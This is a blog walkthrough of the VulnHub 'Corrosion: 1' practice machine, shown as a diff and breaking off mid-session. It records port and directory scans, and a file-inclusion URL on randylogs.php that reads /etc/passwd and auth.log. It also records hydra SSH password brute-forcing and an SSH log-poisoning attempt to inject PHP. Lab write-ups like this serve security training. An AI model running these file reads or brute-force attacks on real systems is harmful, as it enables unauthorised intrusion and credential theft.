@@ -1,0 +1,1209 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../index.css"/>
+<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/vulnhub/corrosion-1</h1>
+
+<p>
+    <a href="../../../index.html">/blog</a>
+    <a href="../../index.html">Security</a>
+    <a href="../index.html">VulnHub</a>
+    <a href="../../../sec/vulnhub/corrosion-1/corrosion-1.html">+ corrosion-1 - 2021.12.23 Thursday</a>
+</p>
+
+<h1 id="corrosion-1">corrosion-1</h1>
+<p><a href="http://www.vulnhub.com/entry/corrosion-1,730/">VulnHub</a> <a href="http://www.vulnhub.com/series/corrosion,491/">Series: Corrosion</a></p>
+<h2 id="description-on-vulnhub">Description on VulnHub</h2>
+<blockquote>
+<p>Difficulty: Easy</p>
+<p>A easy box for beginners, but not too easy. Good Luck.</p>
+<p>Hint: Enumerate Property.</p>
+</blockquote>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:26:16 PM IST 2021.12.23 18:26:16
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+fping -aAqg 192.168.56.1/24
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.79
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:26:32 PM IST 2021.12.23 18:26:32
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+export RHOST=&quot;192.168.56.79&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:26:37 PM IST 2021.12.23 18:26:37
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+_n $RHOST  
+firing nmap 192.168.56.79 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 18:26 IST
+Nmap scan report for 192.168.56.79
+Host is up (0.00018s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:26:42 PM IST 2021.12.23 18:26:42
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+_ntd $RHOST
+firing nmap 192.168.56.79 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 18:26 IST
+Nmap scan report for 192.168.56.79
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0c:a7:1c:8b:4e:85:6b:16:8c:fd:b7:cd:5f:60:3e:a4 (RSA)
+|   256 0f:24:f4:65:af:50:d3:d3:aa:09:33:c3:17:3d:63:c7 (ECDSA)
+|_  256 b0:fa:cd:77:73:da:e4:7d:c8:75:a1:c5:5f:2c:21:0a (ED25519)
+80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.46 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:26:53 PM IST 2021.12.23 18:26:53
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
+[sudo] password for f0c1s: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 18:27 IST
+Nmap scan report for 192.168.56.79
+Host is up (0.00054s latency).
+All 100 scanned ports on 192.168.56.79 are in ignored states.
+Not shown: 95 open|filtered udp ports (no-response), 5 closed udp ports (port-unreach)
+MAC Address: 08:00:27:79:DD:00 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 06:27:51 PM IST 2021.12.23 18:27:51
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sVC -A --script=*enum* | tee nmap.deep-enum.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 18:27 IST
+Nmap scan report for 192.168.56.79
+Host is up (0.00077s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh2-enum-algos: 
+|   kex_algorithms: (9)
+|       curve25519-sha256
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group16-sha512
+|       diffie-hellman-group18-sha512
+|       diffie-hellman-group14-sha256
+|   server_host_key_algorithms: (5)
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ssh-rsa
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (6)
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: (10)
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
+|_http-server-header: Apache/2.4.46 (Ubuntu)
+MAC Address: 08:00:27:79:DD:00 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.77 ms 192.168.56.79
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds</code></pre>
+<p>There are only two ports, web at 80 and ssh at 22.</p>
+<p>The OS is Ubuntu, web server is Apache httpd 2.4.46, ssh is OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0).</p>
+<h2 id="attacking-web">Attacking Web</h2>
+<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.79
++ Target Hostname:    192.168.56.79
++ Target Port:        80
++ Start Time:         2021-12-23 18:29:13 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.46 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5c84b4033ab77, mtime: gzip
++ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
++ 26522 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2021-12-23 18:30:31 (GMT5.5) (78 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,txt,php --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403 -q
+/index.html           (Status: 200) [Size: 10918]
+/tasks                (Status: 301) [Size: 314] [--&gt; http://192.168.56.79/tasks/]
+
+gobuster dir --url http://$RHOST  --wordlist /usr/share/seclists/Discovery/Web-Content/apache.txt -b 404,403 -q 
+/index.html           (Status: 200) [Size: 10918]
+
+gobuster dir --url http://$RHOST  --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -b 404,403 -q    
+/index.html           (Status: 200) [Size: 10918]
+/.                    (Status: 200) [Size: 10918]</code></pre>
+<pre class="shell"><code>dirb http://$RHOST -o dirb.txt -Sr
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: dirb.txt
+START_TIME: Thu Dec 23 18:33:44 2021
+URL_BASE: http://192.168.56.79/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Recursive
+OPTION: Silent Mode
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.56.79/ ----
++ http://192.168.56.79/index.html (CODE:200|SIZE:10918)
++ http://192.168.56.79/server-status (CODE:403|SIZE:278)
+==&gt; DIRECTORY: http://192.168.56.79/tasks/
+
+-----------------
+END_TIME: Thu Dec 23 18:33:46 2021
+DOWNLOADED: 4612 - FOUND: 2</code></pre>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
+301        9l       28w      314c http://192.168.56.79/tasks
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_79-1640264675.state ...
+Scanning: http://192.168.56.79
+Scanning: http://192.168.56.79/tasks</code></pre>
+<p>I guess, only thing to look at is /tasks.</p>
+<h2 id="browsing-web">Browsing web</h2>
+<h3 id="http192.168.56.79"><code>http://192.168.56.79/</code></h3>
+<figure>
+<img src="1.browsing-homepage.png" alt="" /><figcaption>1.browsing-homepage</figcaption>
+</figure>
+<h3 id="http192.168.56.79tasks"><code>http://192.168.56.79/tasks/</code></h3>
+<figure>
+<img src="2.browsing-tasks.png" alt="" /><figcaption>2.browsing-tasks</figcaption>
+</figure>
+<h3 id="http192.168.56.79taskstasks_todo.txt"><code>http://192.168.56.79/tasks/tasks_todo.txt</code></h3>
+<figure>
+<img src="3.browsing-todo.png" alt="" /><figcaption>3.browsing-todo</figcaption>
+</figure>
+<pre><code># Tasks that need to be completed
+
+1. Change permissions for auth log
+2. Change port 22 -&gt; 7672
+3. Set up phpMyAdmin
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x txt,php,log,bak --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q 
+/.                    (Status: 200) [Size: 10918]
+/tasks                (Status: 301) [Size: 314] [--&gt; http://192.168.56.79/tasks/]
+/blog-post            (Status: 301) [Size: 318] [--&gt; http://192.168.56.79/blog-post/]</code></pre>
+<h3 id="http192.168.56.79blog-post"><code>http://192.168.56.79/blog-post/</code></h3>
+<figure>
+<img src="4.browsing-blog-post.png" alt="" /><figcaption>4.browsing-blog-post</figcaption>
+</figure>
+<h3 id="view-sourcehttp192.168.56.79blog-post"><code>view-source:http://192.168.56.79/blog-post/</code></h3>
+<div class="sourceCode" id="cb8"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="kw">&lt;body&gt;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a><span class="kw">&lt;h1&gt;</span>Welcome to my Blog!<span class="kw">&lt;/h1&gt;</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true"></a><span class="kw">&lt;p&gt;</span>This website is in development. Will be updated in the next couple Months! - randy<span class="kw">&lt;/p&gt;</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true"></a></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true"></a><span class="kw">&lt;img</span><span class="ot"> src=</span><span class="st">&quot;image.jpg&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true"></a></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true"></a><span class="kw">&lt;/body&gt;</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>gobuster dir --url http://$RHOST/blog-post -x txt,php,log,bak,py --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>/uploads              (Status: 301) [Size: 326] [--&gt; http://192.168.56.79/blog-post/uploads/]</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>/archives             (Status: 301) [Size: 327] [--&gt; http://192.168.56.79/blog-post/archives/]</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>/.                    (Status: 200) [Size: 190]</span></code></pre></div>
+<h3 id="http192.168.56.79blog-postarchives"><code>http://192.168.56.79/blog-post/archives/</code></h3>
+<figure>
+<img src="5.browsing-archives.png" alt="" /><figcaption>5.browsing-archives</figcaption>
+</figure>
+<h3 id="view-sourcehttp192.168.56.79blog-postarchivesrandylogs.php"><code>view-source:http://192.168.56.79/blog-post/archives/randylogs.php</code></h3>
+<p>Its empty.</p>
+<h3 id="stupid-dirb-dont-want-to-do-hard-work">stupid dirb don’t want to do hard work</h3>
+<div class="sourceCode" id="cb10"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>dirb http://$RHOST /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -o dirb.txt -i </span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>-----------------</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>DIRB v2.22    </span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>By The Dark Raver</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>-----------------</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>OUTPUT_FILE: dirb.txt</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>START_TIME: Thu Dec 23 18:48:37 2021</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a>URL_BASE: http://192.168.56.79/</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>WORDLIST_FILES: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt</span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a>OPTION: Using Case-Insensitive Searches</span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true"></a>-----------------</span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true"></a></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true"></a>GENERATED WORDS: 107982                                                        </span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true"></a>(!) WARNING: Wordlist is too large. This will take a long time to end.</span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true"></a>    (Use mode &#39;-w&#39; if you want to scan anyway)</span></code></pre></div>
+<h3 id="whats-in-the-image">what’s in the image?</h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>exiftool image.jpg          </span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a>ExifTool Version Number         : 12.36</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a>File Name                       : image.jpg</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a>Directory                       : .</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a>File Size                       : 420 KiB</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a>File Modification Date/Time     : 2021:12:23 19:12:26+05:30</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a>File Access Date/Time           : 2021:12:23 19:12:26+05:30</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true"></a>File Inode Change Date/Time     : 2021:12:23 19:12:26+05:30</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true"></a>File Permissions                : -rw-r--r--</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true"></a>File Type                       : JPEG</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true"></a>File Type Extension             : jpg</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true"></a>MIME Type                       : image/jpeg</span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true"></a>JFIF Version                    : 1.01</span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true"></a>Resolution Unit                 : None</span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true"></a>X Resolution                    : 1</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true"></a>Y Resolution                    : 1</span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true"></a>Image Width                     : 1024</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true"></a>Image Height                    : 1024</span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true"></a>Encoding Process                : Progressive DCT, Huffman coding</span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true"></a>Bits Per Sample                 : 8</span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true"></a>Color Components                : 3</span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true"></a>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true"></a>Image Size                      : 1024x1024</span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true"></a>Megapixels                      : 1.0</span></code></pre></div>
+<h3 id="at-this-point">At this point</h3>
+<ul>
+<li>There is one web server, which is serving traffic.</li>
+<li>A note says that there is PhpMyAdmin here, or could be, but I cannot find it yet.</li>
+<li>A user named randy, we know this from the running box image and from the blog-post.
+<ul>
+<li>I can try hydra it, but there is no guarantee that it will ever stop.</li>
+</ul></li>
+<li>/blog-post/ and /blog-post/uploads/ serve same index.html page</li>
+<li>image.jpg doesn’t show anything important.
+<ul>
+<li>But it is crisp and clear.</li>
+</ul></li>
+<li>There is a mention of auth log, but no idea where it could be, or by what name.</li>
+<li>Why is that php page empty?</li>
+</ul>
+<h2 id="reverse-image-search">Reverse image search</h2>
+<figure>
+<img src="6.reverse-image-search-results.png" alt="" /><figcaption>6.reverse-image-search-results</figcaption>
+</figure>
+<figure>
+<img src="7.reverse-image-search-results-2.png" alt="" /><figcaption>7.reverse-image-search-results-2</figcaption>
+</figure>
+<h2 id="fuzzing-randylogs.php">Fuzzing randylogs.php</h2>
+<p>Command fuzz fails, file fuzz succeeds.</p>
+<figure>
+<img src="8.fuzz.png" alt="" /><figcaption>8.fuzz</figcaption>
+</figure>
+<h2 id="view-sourcehttp192.168.56.79blog-postarchivesrandylogs.phpfileetcpasswd"><code>view-source:http://192.168.56.79/blog-post/archives/randylogs.php?file=/etc/passwd</code></h2>
+<figure>
+<img src="9.hey-look-etc-passwd.png" alt="" /><figcaption>9.hey-look-etc-passwd</figcaption>
+</figure>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:118:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:113:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:114:121:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:115:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+nm-openvpn:x:117:122:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+whoopsie:x:118:123::/nonexistent:/bin/false
+sssd:x:119:124:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+saned:x:120:126::/var/lib/saned:/usr/sbin/nologin
+colord:x:121:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:122:128::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:123:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+hplip:x:124:7:HPLIP system user,,,:/run/hplip:/bin/false
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
+randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:127:65534::/run/sshd:/usr/sbin/nologin</code></pre>
+<p><code>randy</code> is the only user.</p>
+<h2 id="logs">Logs</h2>
+<p>I searched for “default apache ubuntu auth logs” and <a href="https://help.ubuntu.com/community/LinuxLogFiles">found /var/log/auth.log here</a></p>
+<p><code>view-source:http://192.168.56.79/blog-post/archives/randylogs.php?file=/var/log/auth.log</code></p>
+<p><a href="1.out-var-log-auth-log.txt">Checkout ./1.out-var-log-auth-log.txt</a></p>
+<figure>
+<img src="10.logs-with-randy-in-it.png" alt="" /><figcaption>10.logs-with-randy-in-it</figcaption>
+</figure>
+<p>I was running hydra earlier.</p>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 07:28:13 PM IST 2021.12.23 19:28:13
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+hydra -l randy -P /usr/share/wordlists/rockyou.txt $RHOST ssh        
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-23 19:29:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.56.79:22/
+[STATUS] 170.00 tries/min, 170 tries in 00:01h, 14344235 to do in 1406:18h, 16 active
+[STATUS] 114.00 tries/min, 342 tries in 00:03h, 14344063 to do in 2097:06h, 16 active
+[STATUS] 106.29 tries/min, 744 tries in 00:07h, 14343661 to do in 2249:14h, 16 active
+^CThe session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.</code></pre>
+<figure>
+<img src="11.hydra-from-a-little-while-back.png" alt="" /><figcaption>11.hydra-from-a-little-while-back</figcaption>
+</figure>
+<h2 id="attack-log-poisoning">Attack: log poisoning</h2>
+<p>Log4j is still going on (today is 2021.12.23), so log poisoning is fresh in my mind.</p>
+<p>So, if I try with user <code>murica</code>, it should get logged.</p>
+<pre class="shell"><code>ssh murica@$RHOST                                                                                               
+The authenticity of host &#39;192.168.56.79 (192.168.56.79)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:h+1ijitcr/kVnfc33XfHyMIJifcp2Vt9He9qc+ph1Xk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.56.79&#39; (ED25519) to the list of known hosts.
+murica@192.168.56.79&#39;s password:</code></pre>
+<figure>
+<img src="12.murica-got-logged.png" alt="" /><figcaption>12.murica-got-logged</figcaption>
+</figure>
+<h3 id="test-for-php-injection">test for php injection</h3>
+<p>Now it is time to test php inject via log. We are running a php page, if our string is getting logged, we might also get our code logged.</p>
+<figure>
+<img src="13.php-injection-in-logs.png" alt="" /><figcaption>13.php-injection-in-logs</figcaption>
+</figure>
+<figure>
+<img src="14.and-we-have-injection.png" alt="" /><figcaption>14.and-we-have-injection</figcaption>
+</figure>
+<h3 id="failed-attempt-at-reverse-shell">Failed attempt at reverse shell</h3>
+<p>I broke the app.</p>
+<figure>
+<img src="15.code-that-breaks-the-app.png" alt="" /><figcaption>15.code-that-breaks-the-app</figcaption>
+</figure>
+<p>Even after reset, I cannot load the file. #BrokeItSoHard.</p>
+<p>Yup, even after killing it and starting again. It fails. I guess, I need to delete it and re-import. What a mess?</p>
+<figure>
+<img src="16.proof-who-are-compelled-wanting-it.png" alt="" /><figcaption>16.proof-who-are-compelled-wanting-it</figcaption>
+</figure>
+<h2 id="reimport-and-retry-another-attack.">Reimport and retry another attack.</h2>
+<figure>
+<img src="17.recreated-box.png" alt="" /><figcaption>17.recreated-box</figcaption>
+</figure>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 08:54:31 PM IST 2021.12.23 20:54:31
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+fping -aAqg 192.168.56.1/24                                                                                                                                                                           
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.80
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 08:54:45 PM IST 2021.12.23 20:54:45
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+export RHOST=&quot;192.168.56.80&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;</code></pre>
+<p>IP changed because MAC address changed.</p>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 08:54:52 PM IST 2021.12.23 20:54:52
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+hydra -l randy -p &#39;oh boy&#39; $RHOST ssh 
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-23 20:55:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://192.168.56.80:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-23 20:55:39
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
